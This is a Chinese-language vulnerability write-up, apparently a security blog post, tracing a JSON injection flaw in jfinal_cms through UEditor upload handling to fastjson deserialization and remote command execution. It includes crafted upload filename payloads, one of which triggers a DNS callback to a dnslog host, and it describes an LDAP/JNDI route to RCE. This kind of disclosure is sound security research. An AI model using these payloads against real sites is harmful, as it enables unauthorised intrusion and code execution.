# jfinal_cms存在json注入漏洞

#### TL;DR

`jfinal_cms`存在`json`注入漏洞，在大部分版本可以导致前台远程命令执行。

原因在于`com.baidu.ueditor.define.BaseState#toString`方法通过拼接的方式处理`Map`键值对。逃逸出恶意属性后可通过`parseObject`函数触发该漏洞。该漏洞存在于`v4.0.0~v.5.1.0`版本，可利用`dnslog`版本为`v4.5.0~v.5.1.0`，可`RCE`版本为`v4.5.0~v.5.0.1`。

#### versions affected

`version affected`：`jfnal_cms v4.5.0~v5.1.0`

`RCE version(default)`:`jfnal_cms v4.5.0~v5.0.1(fastjson 1.2.28)`

#### find gadget

`sink`点在`com.baidu.ueditor.define.BaseState#toString`，主要逻辑就是对`map`进行遍历，把`key`和`value`进行处理最终制作成`JSON`字符串形式。
其中`key`和`value`用`+`进行拼接，如果`key`或`value`可控的话可能会导致`json`注入问题。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694866213804.jpg)

向上寻找`usage`，`ActionEnter#invoke`方法调用了`state#toJSONString`,可以看到当`ActionMap`为`UPLOAD_FILE`（文件上传）操作时会触发 `Uploader#doExec`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-2.png)

先看`Uploader#doExec`的逻辑，这里会根据是否`base64`调用不同类的`save`方法。当操作为`UPLOAD_FILE`时配置类`ConfigManager`的`isBase64`为`false`，所以`Uploader#doExec`触发`BinaryUploader#save`。
```java
		case ActionMap.UPLOAD_FILE:
			conf.put("isBase64", "false");
			conf.put("maxSize", this.jsonConfig.getLong("fileMaxSize"));
			conf.put("allowFiles", this.getArray("fileAllowFiles"));
			conf.put("fieldName", this.jsonConfig.getString("fileFieldName"));
			savePath = this.jsonConfig.getString("filePathFormat");
			break;
```

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-3.png)

审计`BinaryUploader#save`函数，可以看到`originFileName`是由上传表单的`filename`控制的，值得注意的一点是程序（仅仅）校验了后缀名，这里令`filename`为`filename=flag","vulnerable":"hacked","a":".txt`即可绕过，最终把`originFileName`放进`Map`

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-4.png)

接着触发`toJSONString`通过拼接把恶意字符处理为字符串。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868670291.png)


继续向上寻找利用链，发现以上函数调用可以通过`/ueditor`路由触发，其中返回的`out`为恶意字符串，最终把`out`传给了`UeditorService#uploadHandle`。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694868878079.png)

`UeditorService#uploadHandle`通过`parseObject`方法对恶意字符串进行解析，可以看到`json`已经被污染了。

![Alt text](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-5.png)

遗憾的是在可以污染`json`属性后我并没有发现通过污染而覆盖的属性值可以造成什么实际危害。

因此只能想办法利用`parseObject`。`json`的第一个属性`"state":"SUCCESS`"是不可控的，这里用到一个小`trick`，令`filename`为`flag",{"@type":"java.net.Inet4Address","val":"bgb5eh.ceye.io"},"a":".txt`即可正常恢复`Java Bean`。

由于最新的版本`v5.1.0`用到的`fastjson`为`1.2.62`并且没有开`autoType`，作为一个菜逼我没有找到`RCE`的办法。但是经过测试发现`v4.5.0~v5.0.1`用的都是`fastjson 1.2.28`,使用缓存即可绕过，用`ldap`打个`fastjson`全版本通杀反序列化链子即可`RCE`。

#### dnslog test
`DNS`测试在`v4.5.0`版本进行，运行测试脚本。


`dnslog`收到了请求，证明漏洞存在，值得注意的是如果版本在`v4.5.0-v5.0.1`之间是会发起两次`DNS`请求的，因为这些版本默认用到的`fastjson`版本为`1.2.28`，因此也可以作为指纹去判断是否可利用。
![image-20230917132528175](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20230917132528175.png)

#### RCE test

`RCE`测试在`v5.0.1`版本进行。

运行`jndi`服务端。

![1694926217388](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926217388.png)

运行`exp.py`即可`RCE`。

![1694926173785](https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1694926173785.png)